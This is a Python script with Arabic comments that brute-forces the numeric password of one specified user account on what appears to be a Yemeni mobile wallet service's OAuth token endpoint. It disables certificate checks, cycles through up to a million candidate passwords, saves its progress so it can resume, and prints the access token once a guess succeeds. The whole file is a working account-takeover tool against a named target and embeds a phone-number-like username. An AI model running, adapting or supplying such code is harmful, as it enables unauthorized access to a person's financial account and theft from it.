import requests
import time
import os
from requests.exceptions import RequestException

# إلغاء تحذيرات SSL
requests.packages.urllib3.disable_warnings()

# الإعدادات الأساسية
BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
ENDPOINT = "oauth/token"
FULL_URL = BASE_URL + ENDPOINT

BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "772490746",
    "scope": "openid"
}

initial_password = 142800533
MAX_ATTEMPTS = 1_000_000

PROGRESS_FILE = "sh.txt"

# عدد المحاولات بين كل عملية حفظ وطباعة تقدم
SAVE_INTERVAL = 10
PRINT_INTERVAL = 10

def load_progress():
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r") as f:
                return int(f.read().strip())
        except (ValueError, IOError):
            return None
    return None

def save_progress(value):
    """حفظ الرقم الحالي مع تفريغ فوري للبيانات على القرص."""
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(value))
        f.flush()          # تأكيد الكتابة الفورية
        os.fsync(f.fileno())  # ضمان الكتابة الفعلية (اختياري)

def get_access_token():
    saved = load_progress()
    if saved is not None:
        current_password = saved + 1
        print(f"🔄 استئناف التخمين من الرقم {current_password} (آخر محفوظ: {saved})")
    else:
        current_password = initial_password
        print(f"🔄 بدء التخمين من الرقم {current_password}")

    attempt = 0
    while attempt < MAX_ATTEMPTS:
        attempt += 1
        data = BASE_DATA.copy()
        data["password"] = str(current_password)

        try:
            response = requests.post(FULL_URL, data=data, verify=False, timeout=10)

            if response.status_code == 200:
                json_response = response.json()
                save_progress(current_password)  # حفظ الرقم الناجح
                print("\n✅ تم الحصول على التوكن بنجاح!")
                print(f"🔐 كلمة المرور الصحيحة: {current_password}")
                print(f"📦 الرد الكامل: {json_response}")
                print(f"🔑 التوكن: {json_response.get('access_token')}")
                print(f"⏳ ينتهي بعد: {json_response.get('expires_in')} ثانية")
                return json_response
            else:
                pass  # فشل – لا نطبع شيئاً

        except RequestException:
            pass  # خطأ شبكة – لا نطبع شيئاً

        # حفظ التقدم كل 100 محاولة
        if attempt % SAVE_INTERVAL == 0:
            save_progress(current_password)

        # طباعة التقدم كل 1000 محاولة (للمتابعة)
        if attempt % PRINT_INTERVAL == 0:
            print(f"⏳ تمت {attempt} محاولة، آخر رقم تم اختباره: {current_password}")

        current_password += 1
        time.sleep(0.001)  # تقليل الضغط على الخادم

    print("❌ فشلت جميع المحاولات (وصلت للحد الأقصى).")
    return None

if __name__ == "__main__":
    token_data = get_access_token()
    if token_data:
        print("✅ البوت يعمل بنجاح.")
    else:
        print("❌ تعذر الحصول على التوكن.")
